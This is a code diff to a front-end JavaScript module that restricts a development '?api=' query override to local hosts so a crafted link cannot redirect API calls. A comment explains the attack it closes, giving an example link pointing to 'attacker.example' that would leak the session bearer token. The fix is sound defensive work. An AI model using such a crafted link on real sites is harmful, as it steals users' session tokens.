@@ -47,20 +47,45 @@
     return el ? clean(el.getAttribute('content')) : null;
   }
 
+  function isLocalHost(host) {
+    var h = typeof host === 'string' ? host : (global.location ? global.location.hostname : '');
+    if (LOCAL_HOSTS.indexOf(h) !== -1) return true;
+    // 192.168.x.x / 10.x.x.x — a phone testing against the dev machine
+    return /^(?:10|127)\.\d+\.\d+\.\d+$/.test(h) || /^192\.168\.\d+\.\d+$/.test(h);
+  }
+
+  /**
+   * `?api=` is a DEVELOPMENT switch, and it is deliberately crippled.
+   *
+   * Every API call carries the session bearer token, so an attacker who can
+   * choose the API origin can harvest it: send someone
+   * `https://<the real site>/?api=https://attacker.example`, they open a page
+   * that looks entirely legitimate, and their token is posted straight to the
+   * attacker. The page origin, the TLS certificate and the padlock all still
+   * look right, which is what makes it dangerous.
+   *
+   * So it is honoured only when BOTH the page and the target are local: on a
+   * deployed origin the parameter is ignored outright, and even locally it
+   * cannot be pointed at a remote host. To develop against a remote API, set
+   * the <meta name="api-base"> tag instead — that requires editing the page,
+   * which an attacker sending a link cannot do.
+   */
   function fromQuery() {
     if (!global.location || !global.location.search) return null;
+    if (!isLocalHost()) return null;
+    var raw;
     try {
-      return clean(new URLSearchParams(global.location.search).get('api'));
+      raw = clean(new URLSearchParams(global.location.search).get('api'));
     } catch (err) {
       return null;
     }
-  }
-
-  function isLocalHost() {
-    var host = global.location ? global.location.hostname : '';
-    if (LOCAL_HOSTS.indexOf(host) !== -1) return true;
-    // 192.168.x.x / 10.x.x.x — a phone testing against the dev machine
-    return /^(?:10|127)\.\d+\.\d+\.\d+$/.test(host) || /^192\.168\.\d+\.\d+$/.test(host);
+    if (!raw) return null;
+    try {
+      if (!isLocalHost(new URL(raw).hostname)) return null;
+    } catch (err) {
+      return null;
+    }
+    return raw;
   }
 
   var existing = global.STOCKDROP && typeof global.STOCKDROP === 'object' ? global.STOCKDROP : {};
